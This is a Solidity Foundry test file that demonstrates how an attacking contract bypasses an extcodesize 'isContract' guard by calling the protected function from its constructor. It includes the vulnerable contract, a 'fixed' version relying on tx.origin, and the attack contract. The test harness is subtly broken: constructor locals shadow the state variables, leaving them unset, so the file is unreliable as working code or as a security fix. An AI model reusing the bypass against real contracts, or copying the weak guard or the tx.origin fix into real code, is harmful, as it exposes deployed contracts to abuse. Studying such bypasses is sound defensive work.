// SPDX-License-Identifier: MIT

import "forge-std/Test.sol";
import "forge-std/console.sol";

pragma solidity 0.8.19;

contract Target{

function isContract(address adr) public view returns(bool){
uint256 size;
assembly{
    size:=extcodesize(adr)

}
return size>0;
}

bool public pwc=false;
function Protected() public {
 require(!isContract(msg.sender),"you are a contract");
 pwc=true;
}}

contract TargetFixed{

function isContract(address adr) public view returns(bool){
require(tx.origin==msg.sender,"you cant");
return adr.code.length>0;
}

bool public pwc=false;
function Protected() public {
 require(!isContract(msg.sender),"you are a contract");
 pwc=true;
}}

contract Attack{
     bool public isContract=false;

    
    constructor(address target){
    isContract=Target(target).isContract(address(this));
    console.log(isContract);
    Target(target).Protected();
    }


}

contract FailedTest is Test{

    function test_pwc(address target) public{
     vm.expectRevert();
     Target(target).Protected();
    }
}
contract ContractTest is Test {
FailedTest failedTest;
Attack attack;
Target target;
TargetFixed targetFixed;

constructor(){
FailedTest failedTest=new FailedTest();
Target target= new Target();
TargetFixed targetFixed=new TargetFixed();
}

function test_BypassContractCheck() public{
   console.log(target.pwc());   
  Attack attack=new Attack(address(target));
console.log(target.pwc());


}
function test_BypassfailedContractCheck() public{
   console.log(target.pwc());   
failedTest.test_pwc(address(target));
console.log(target.pwc());


}
}

